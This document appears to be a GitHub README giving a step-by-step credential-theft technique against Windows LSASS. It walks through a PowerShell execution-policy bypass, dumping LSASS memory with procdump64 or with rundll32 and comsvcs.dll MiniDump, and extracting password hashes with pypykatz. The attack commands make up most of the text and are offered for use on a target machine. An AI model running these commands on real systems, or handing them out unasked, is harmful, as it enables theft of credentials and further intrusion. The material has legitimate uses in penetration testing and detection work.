# Lsass-dump

Don't need mimikatz. You can now dump hashes from LSASS by abusing LSASS process and generate a lsass.dmp file. After that we will use pypykatz to extarct the hashes from lsass.dmp file.

# Exploitation

First we must have an administrative privilege to carry this attack.
Upload [procdump64.exe](https://github.com/k4sth4/lsass-dump/blob/main/procdump64.exe) to target machine.

### Execute Powershell
```markdown
powershell.exe -ep bypass
```

### Get te lassa process id
```markdown
get-process lsass
```

![OnPaste 20220609-133131](https://user-images.githubusercontent.com/106917304/172796695-6b4a5377-2e04-4bfd-9841-453c8a61b8ca.png)

In our case 596 is the lsass process ID.
Execute it with [procdump64.exe](https://github.com/k4sth4/lsass-dump/blob/main/procdump64.exe) and generate a file contain hashes.

### Dumping Hashes into a file
```markdown
.\procdump64.exe -accepteula -ma 556 lsass.dmp
```

## ALTERNATE

We can also use native DLLs instead of procdump64.exe, this way we don't have to upoad anything on target machine.
```markdown
C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 556 C:\\Users\\Bob\\Desktop\\lsass.dmp full
```

![OnPaste 20220609-134015](https://user-images.githubusercontent.com/106917304/172800153-21110c80-b8a2-4bb0-a7cb-79e167041ec2.png)


![OnPaste 20220609-135307](https://user-images.githubusercontent.com/106917304/172800664-bd459ddc-50cc-42e6-8380-de12de0b4643.png)



### Using Pypykatz

Now we get that lsass.dmp file to our attacking machine and exctract the hashes using pypykatz.
```markdown
pypykatz lsa minidump lsass.dmp
```

![OnPaste 20220609-135650](https://user-images.githubusercontent.com/106917304/172801351-c615e903-a4b4-41e3-a349-5bd59beb1a18.png)


